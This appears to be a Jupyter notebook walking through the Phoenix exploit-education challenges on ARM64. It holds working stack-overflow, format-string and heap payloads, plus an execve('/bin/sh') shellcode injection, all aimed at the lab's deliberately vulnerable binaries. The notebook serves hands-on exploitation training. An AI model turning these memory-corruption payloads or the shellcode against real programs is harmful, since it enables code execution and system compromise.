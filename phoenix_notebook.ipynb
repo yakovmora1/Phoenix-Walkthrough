{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "54c88afd-1b2f-4874-b159-f8cf0ed2ef32",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " a: 0x496c5962 is b'bYlI'\n",
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI'\n"
     ]
    }
   ],
   "source": [
    "# challenge 1\n",
    "import struct\n",
    "a = 0x496c5962\n",
    "a_byte = struct.pack(\"<I\", a)\n",
    "\n",
    "# this is the bytes  from 64 to 68 including\n",
    "print(f\" a: {hex(a)} is {a_byte}\")\n",
    "# build payload:\n",
    "print((b'A' * 64) + a_byte)\n",
    "# full command : python -c \"print((b'A' * 64) + b'bYlI')\"\n",
    "#./stack-one `python -c \"print((b'A' * 64) + b'bYlI')\"`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "b62e531a-2114-4098-b057-d1cb88ad2c63",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " a: 0xd0a090a is b'\\n\\t\\n\\r'\n",
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\\t\\n\\r'\n"
     ]
    }
   ],
   "source": [
    "# challenge 2\n",
    "import struct\n",
    "a = 0x0d0a090a\n",
    "a_byte = struct.pack(\"<I\", a)\n",
    "\n",
    "# this is the bytes  from 64 to 68 including\n",
    "print(f\" a: {hex(a)} is {a_byte}\")\n",
    "# build payload:\n",
    "print((b'A' * 64) + a_byte)\n",
    "# full command : python -c \"print((b'A' * 64) + b'\\n\\t\\n\\r')\"\n",
    "#ExploitEducation=`python -c \"print((b'A' * 64) + b'\\n\\t\\n\\r')\"` ./stack-two"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "969bfb9b-6740-4765-9079-4c28bfb72bc7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " a: 0x4007c4 is b'\\xc4\\x07@\\x00\\x00\\x00\\x00\\x00'\n",
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xc4\\x07@\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    }
   ],
   "source": [
    "#challenge3\n",
    "\n",
    "# congrats function address : 0x4007c4\n",
    "func_addr = 0x04007c4\n",
    "func_addr_data = struct.pack(\"<Q\", func_addr)\n",
    "\n",
    "# this is the bytes  from 64 to 68 including\n",
    "print(f\" a: {hex(func_addr)} is {func_addr_data}\")\n",
    "# build payload:\n",
    "print((b'A' * 64) + func_addr_data)\n",
    "#echo -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xc4\\x07@\\x00\\x00\\x00\\x00\\x00\" | ./stack-three \n",
    "#python -c \"print((b'A' * 64) + b'\\xc4\\x07@\\x00\\x00\\x00\\x00\\x00')\" | ./stack-three"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "9f46a0c8-3fc3-4ff9-bfcf-4dc00f34046a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " a: 0x400714 is b'\\x14\\x07@\\x00\\x00\\x00\\x00\\x00'\n",
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x14\\x07@\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "88"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#challenge4\n",
    "\n",
    "# complete level function address : 0x400714\n",
    "func_addr = 0x0400714\n",
    "func_addr_data = struct.pack(\"<Q\", func_addr)\n",
    "\n",
    "# this is the bytes  from 64 to 68 including\n",
    "print(f\" a: {hex(func_addr)} is {func_addr_data}\")\n",
    "# build payload (buffer + ret local variable) + stored x30 wihch is lr:\n",
    "print((b'A' * 80) + func_addr_data)\n",
    "# command python -c \"print((b'A' * 80) + b'\\x14\\x07@\\x00\\x00\\x00\\x00\\x00')\"\n",
    "len(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "id": "6db31a46-3be7-48f8-8c97-13ccc55f0de6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "prev stack addr: b'BBBBBBBB'\n",
      "shellcode addr: b'`\\xf5\\xff\\xff\\xff\\xff\\x00\\x00'\n",
      " shellcode is bytearray(b'\\xa8\\x1b\\x80\\xd2\\xe0\\x00\\x00\\x10\\xff\\x0f\\x1e\\xf8\\xe0\\x8f\\x1f\\xf8\\xe1\\x03\\x00\\x91\\xe2\\x03\\x1f\\xaa\\x01\\x00\\x00\\xd4\\xc0\\x03_\\xd6/bin/sh\\x00')\n",
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB`\\xf5\\xff\\xff\\xff\\xff\\x00\\x00\\xa8\\x1b\\x80\\xd2\\xe0\\x00\\x00\\x10\\xff\\x0f\\x1e\\xf8\\xe0\\x8f\\x1f\\xf8\\xe1\\x03\\x00\\x91\\xe2\\x03\\x1f\\xaa\\x01\\x00\\x00\\xd4\\xc0\\x03_\\xd6/bin/sh\\x00'\n"
     ]
    }
   ],
   "source": [
    "#challenge5\n",
    "\n",
    "# shellcode bytes\n",
    "payload = bytearray.fromhex(\"\".join(\"a8 1b 80 d2 e0 00 00 10 ff 0f 1e f8 e0 8f 1f f8 e1 03 00 91 e2 03 1f aa 01 00 00 d4 c0 03 5f d6 2f 62 69 6e 2f 73 68 00\".split(\" \")))\n",
    "prev_stack_addr = b'B' * 8\n",
    "# this is where we are going to return\n",
    "shellcode_addr = struct.pack(\"<Q\", 0x0000fffffffff560)\n",
    "\n",
    "print(f\"prev stack addr: {prev_stack_addr}\")\n",
    "print(f\"shellcode addr: {shellcode_addr}\")\n",
    "# this is our shellcode to be executed\n",
    "print(f\" shellcode is {payload}\")\n",
    "# stack frame size of start level func is 144 but buffer starts from offset 0x10\n",
    "print((b'A' * 128) + prev_stack_addr + shellcode_addr + payload)\n",
    "# command python -c \"print((b'A' * 128) + (b'B' * 8 ) + b'\\x60\\xf5\\xff\\xff\\xff\\xff\\x00\\x00' + b'\\xa8\\x1b\\x80\\xd2\\xe0\\x00\\x00\\x10\\xff\\x0f\\x1e\\xf8\\xe0\\x8f\\x1f\\xf8\\xe1\\x03\\x00\\x91\\xe2\\x03\\x1f\\xaa\\x01\\x00\\x00\\xd4\\xc0\\x03_\\xd6/bin/sh\\x00')\"\n",
    "\n",
    "\"\"\"\n",
    "finally the command that worked was:\n",
    "(python -c \"print((b'A' * 128) + (b'B' * 8 ) + b'\\x80\\xf5\\xff\\xff\\xff\\xff\\x00\\x00' + b'\\xa8\\x1b\\x80\\xd2\\xe0\\x00\\x00\\x10\\xff\\x0f\\x1e\\xf8\\xe0\\x8f\\x1f\\xf8\\xe1\\x03\\x00\\x91\\xe2\\x03\\x1f\\xaa\\x01\\x00\\x00\\xd4\\xc0\\x03_\\xd6/bin/sh\\x00')\";cat) | ./stack-five\n",
    "\n",
    "Key notes;\n",
    "1. stack layout is changed depnding on env. variables (gdb vs regular execeution).\n",
    "    GDB puts more envirnoment variables which changes the stack layout.\n",
    "    To solve this we can change the stack address till we get something we can work with.\n",
    "    The easiest is to play with the stack address on a small shellcode that does infinite loop, that attach with gdb and\n",
    "    findout the stack address.\n",
    "    The other way is to put nop sled (pretty big, atleast 100 bytes to slide into the shellcode).\n",
    "2. when /bin/sh is executed it need an open STDIN therefore, we must keep it open with cat command.\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f23b3bd5-262e-4f9e-9681-10bd05d284a4",
   "metadata": {},
   "outputs": [],
   "source": [
    "#challenge format string 0\n",
    "# just provide %p%p%p%p%p%p%p"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "id": "81c503f3-de0f-47f8-8d29-9ede7a148189",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " offset : 32 there for we need to write 4.0 pointers\n",
      "The target value is: b'lOvE'\n"
     ]
    }
   ],
   "source": [
    "#challenge fromat string 1\n",
    "# the address of the changeme variable on stack\n",
    "offset = 0x0000fffffffff538 - 0x0000fffffffff518\n",
    "print(f\" offset : {offset} there for we need to write { offset / 8} pointers\")\n",
    "\n",
    "target_value = struct.pack(\"<I\", 0x45764f6c)\n",
    "print(f\"The target value is: {target_value}\")\n",
    "\n",
    "\n",
    "#We need to run the following (without trailing new line:\n",
    "#python3 -c \"print(('%16p' + '%16p') + 'lOvE', end = '')\"\n",
    "#Note: better use echo to eliminate trailing new  lines"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "id": "c6069567-db0b-415d-a880-e972a1ada030",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " offset : 0x410b68\n",
      "our buffer starts on 281474976707616\n",
      "The address we have on the second argument is 281474976707848 so the offset is 232 bytes\n",
      "target addr encoded b'h\\x0bA\\x00\\x00\\x00\\x00\\x00'\n",
      "b'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x.%x.%x.%x.%nh\\x0bA\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    }
   ],
   "source": [
    "#challenge fromat string 2\n",
    "# The address of changeme variable is :0x410b68\n",
    "\n",
    "# the address of the changeme variable on stack\n",
    "changeme_addr = 0x410b68\n",
    "print(f\" offset : {hex(changeme_addr)}\")\n",
    "\n",
    "buffer_start = 0x0000fffffffff420\n",
    "ptr = 0x0000fffffffff508\n",
    "print(f\"our buffer starts on {0x0000fffffffff420}\")\n",
    "print(f\"The address we have on the second argument is {0x0000fffffffff508} so the offset is {ptr - buffer_start} bytes\")\n",
    "\n",
    "changeme_addr = struct.pack(\"<Q\", 0x410b68)\n",
    "print(f\"target addr encoded {changeme_addr}\")\n",
    "\n",
    "#We need to run the following :\n",
    "# Note: in musl implementation we allowed to put maximum 9 arguments, This is implied by checking that the number before '$'\n",
    "# is a digit (via isdigit function)\n",
    "# we make the printf to \"pop\" arguments so we will get to a place in the stack where the target address is\n",
    "# %n will write our addresss there.\n",
    "print((b'%x' * 18) + b'.%x.%x.%x' + b'.%n' + b'h\\x0bA\\x00\\x00\\x00\\x00\\x00')\n",
    "#'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x.%x.%x.%x.%nh\\x0bA\\x00\\x00\\x00\\x00\\x00'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 184,
   "id": "0de820b4-816d-400d-942c-c03ac8deafa6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "offset : 0x410b08\n",
      "changeme value : b'ExEd'\n",
      "char number 3 is : 0x45 (69) - this is the number of printed characters we need\n",
      "char number 2 is : 0x78 (120) - this is the number of printed characters we need\n",
      "char number 1 is : 0x45 (69) - this is the number of printed characters we need\n",
      "char number 0 is : 0x64 (100) - this is the number of printed characters we need\n",
      "our buffer starts on 0xfffffffff540\n",
      "b'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%25551x%n%5120x%hnBB\\n\\x0bA\\x00\\x00\\x00\\x00\\x00CCCCCCCC\\x08\\x0bA\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    }
   ],
   "source": [
    "#challenge fromat string 3\n",
    "# The address of changeme variable is :0x410b68\n",
    "\n",
    "# the address of the changeme variable on stack\n",
    "changeme_addr = 0x410b08\n",
    "changeme_value = struct.pack(\"<I\", 0x64457845)\n",
    "print(f\"offset : {hex(changeme_addr)}\")\n",
    "print(f\"changeme value : {changeme_value}\")\n",
    "\n",
    "for index, char in enumerate(changeme_value):\n",
    "    print(f\"char number {3 - index} is : {hex(char)} ({char}) - this is the number of printed characters we need\")\n",
    "\n",
    "buffer_start = 0x0000fffffffff540\n",
    "print(f\"our buffer starts on {hex(buffer_start)}\")\n",
    "\n",
    "\n",
    "\n",
    "#We need to run the following :\n",
    "\"\"\"\n",
    "Notes:\n",
    "1. we can use %<value>x where <value> can be any number (depending on the system of course) to increase\n",
    "the number of bytes printed so far.\n",
    "2. %hn will output short value (2 bytes) only this is how we wan't overwrite the cahngeme value we wrote before.\n",
    "\"\"\"\n",
    "print((b'%x' * 16) + (b'%x' * 6) + b'%25551x' + b'%n' + b'%5120x' + b'%hn' + (b'B' * 2) + b'\\x0a\\x0b\\x41\\x00\\x00\\x00\\x00\\x00' + (b'C' * 8) + b'\\x08\\x0b\\x41\\x00\\x00\\x00\\x00\\x00')\n",
    "#python -c \"print((b'%x' * 16) + (b'%x' * 6) + b'%25551x' + b'%n' + b'%5120x' + b'%hn' + (b'B' * 2) + b'\\x0a\\x0b\\x41\\x00\\x00\\x00\\x00\\x00' + (b'C' * 8) + b'\\x08\\x0b\\x41\\x00\\x00\\x00\\x00\\x00')\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 182,
   "id": "b201ae39-4ab6-44ed-9f58-d88772d1de6d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "8"
      ]
     },
     "execution_count": 182,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Heap 0 challenge\n",
    "# Just pass it as an argument : python3 -c \"import sys; sys.stdout.buffer.write((b'A' * 0x50) + b'\\xb4\\x0b\\x40')\")\n",
    "#Note: in python3 the print() prints string therefore we must used buffer.write to output raw bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "3656bb6d-fb07-4f31-8aa8-a807c70afd4e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "second arg is: b'0`\\xe5\\xb7\\xff\\xff\\x00\\x00'\n",
      "first arg is:\n",
      "bytearray(b'\\x8e|\\x81\\xd2\\x0e\\x08\\xa0\\xf2\\xc0\\x01\\x1f\\xd6AAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xd8\\xf4\\xff\\xff\\xff\\xff\\x00\\x00')\n"
     ]
    }
   ],
   "source": [
    "# Heap 1 challenge\n",
    "addr_first_malloc_name_arg =   0xffffb7e56030\n",
    "addr_second_malloc_structure = 0xffffb7e56050\n",
    "winner_func_addr = struct.pack(\"<Q\", 0x400be4)\n",
    "\n",
    "br_to_win_shellcode = \"8e 7c 81 d2 0e 08 a0 f2 c0 01 1f d6\"\n",
    "br_to_win_shellcode = bytearray.fromhex(\"\".join(br_to_win_shellcode))\n",
    "\n",
    "stack_ra_pointer = struct.pack(\"<Q\", 0x0000fffffffff4d8)\n",
    "addr_first_malloc_name_arg_bytes = struct.pack(\"<Q\", addr_first_malloc_name_arg)\n",
    "# Note: because we are passing via argv[] we can't put null bytes in the command line therefore,\n",
    "#      we cant overwrite the RA of main\n",
    "print(f\"second arg is: {addr_first_malloc_name_arg_bytes}\")\n",
    "print(\"first arg is:\")\n",
    "print((br_to_win_shellcode + b'A' * (addr_second_malloc_structure - addr_first_malloc_name_arg - len(br_to_win_shellcode) + 8)) + stack_ra_pointer)\n",
    "\n",
    "#In gdb:\n",
    "# we run: $(echo -ne '\\x8e|\\x81\\xd2\\x0e\\x08\\xa0\\xf2\\xc0\\x01\\x1f\\xd6AAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xd8\\xf4\\xff\\xff\\xff\\xff\\x00\\x00') $(echo -ne '0`\\xe5\\xb7\\xff\\xff\\x00\\x00')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "8481d12c-4c93-442a-9759-fca35335536a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Heap 2 challenge\n",
    "# Its basically UAF\n",
    "'A' * 33"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f2dec2e8-3d6b-42e4-a002-ea52e0e4fbb2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Heap 3 challenge"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "38b24ec4-27dc-4e6e-ad17-9fc26757c819",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "We got bytearray(b'\\\\\\x13-\\xa2')\n",
      "We need to pass:  0xa22d135c\n",
      "Which is:  b'\\xa2-\\x13\\\\'\n"
     ]
    }
   ],
   "source": [
    "#Network 0 challenge\n",
    "import subprocess\n",
    "import struct\n",
    "\n",
    "# Start the process and create a pipe to its stdin\n",
    "proc = subprocess.Popen(['/opt/phoenix/arm64/net-zero'], stdin=subprocess.PIPE, stdout = subprocess.PIPE)\n",
    "\n",
    "print(\"Process executing! {}\".format(proc))\n",
    "\n",
    "data = proc.stdout.readline()\n",
    "print(data)\n",
    "data = proc.stdout.readline()\n",
    "print(data)\n",
    "\n",
    "# parse the line\n",
    "number = data.split(b\"'\")[1]\n",
    "print(\"the number is : {}\".format(number))\n",
    "number = int(number)\n",
    "print(\" in hex: {}\".format(hex(number)))\n",
    "\n",
    "output_data = struct.pack(\"<I\", number)\n",
    "print(output_data)\n",
    "# Write to the process's stdin\n",
    "proc.stdin.write(output_data)\n",
    "proc.stdin.flush()\n",
    "\n",
    "# Close stdin if no more data will be sent\n",
    "proc.stdin.close()\n",
    "\n",
    "\n",
    "data = proc.stdout.readline()\n",
    "print(data)\n",
    "proc.stdout.flush()\n",
    "proc.stdout.close()\n",
    "# Wait for the process to complete\n",
    "rc = proc.wait()\n",
    "print(\"return code is : {}\".format(rc))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "271c959c-978d-4c4e-8537-926fd29ea793",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'3743283689'"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Network 1 challenge\n",
    "import subprocess\n",
    "import struct\n",
    "\n",
    "# Start the process and create a pipe to its stdin\n",
    "proc = subprocess.Popen(['/opt/phoenix/arm64/net-one'], stdin=subprocess.PIPE, stdout = subprocess.PIPE)\n",
    "\n",
    "print(\"Process executing! {}\".format(proc))\n",
    "\n",
    "data = proc.stdout.readline()\n",
    "print(data)\n",
    "data = proc.stdout.read(4)\n",
    "print(data)\n",
    "\n",
    "# parse the line\n",
    "output_data = struct.unpack(\"<I\", data)[0]\n",
    "print(\"the number is {}\".format(output_data))\n",
    "print(\"Encoded: {}\".format(str(output_data).encode(\"ascii\")))\n",
    "output_data = str(output_data).encode(\"ascii\")\n",
    "\n",
    "# Write to the process's stdin\n",
    "proc.stdin.write(output_data)\n",
    "proc.stdin.flush()\n",
    "\n",
    "# Close stdin if no more data will be sent\n",
    "proc.stdin.close()\n",
    "\n",
    "\n",
    "data = proc.stdout.readline()\n",
    "print(data)\n",
    "proc.stdout.flush()\n",
    "proc.stdout.close()\n",
    "# Wait for the process to complete\n",
    "rc = proc.wait()\n",
    "print(\"return code is : {}\".format(rc))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "5e02cdf9-98da-473b-87ea-918dbd0e6de5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x2b3133daefb04b4b7\n",
      "49797213326510699703\n",
      "0xffffffffffffffff\n"
     ]
    }
   ],
   "source": [
    "# Net 2 challenge\n",
    "import subprocess\n",
    "import struct\n",
    "import ctypes\n",
    "\n",
    "\n",
    "# Start the process and create a pipe to its stdin\n",
    "proc = subprocess.Popen(['/opt/phoenix/arm64/net-two'], stdin=subprocess.PIPE, stdout = subprocess.PIPE)\n",
    "\n",
    "print(\"Process executing! {}\".format(proc))\n",
    "final_val = 0\n",
    "\n",
    "# parse the data\n",
    "data = proc.stdout.readline()\n",
    "print(data)\n",
    "data = proc.stdout.readline()\n",
    "print(data)\n",
    "for i in range(8):\n",
    "    data = proc.stdout.read(8)\n",
    "    print(data)\n",
    "    output_data = struct.unpack(\"<Q\", data)[0]\n",
    "    print(\"the number is {}\".format(output_data))\n",
    "    final_val = ctypes.c_uint64(output_data + final_val).value\n",
    "\n",
    "print(\"final_value is: {}\".format(final_val))\n",
    "\n",
    "final_data = struct.pack(\"<Q\", final_val)\n",
    "# Write to the process's stdin\n",
    "proc.stdin.write(final_data)\n",
    "proc.stdin.flush()\n",
    "\n",
    "# Close stdin if no more data will be sent\n",
    "proc.stdin.close()\n",
    "\n",
    "\n",
    "data = proc.stdout.readline()\n",
    "print(data)\n",
    "proc.stdout.flush()\n",
    "proc.stdout.close()\n",
    "# Wait for the process to complete\n",
    "rc = proc.wait()\n",
    "print(\"return code is : {}\".format(rc))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
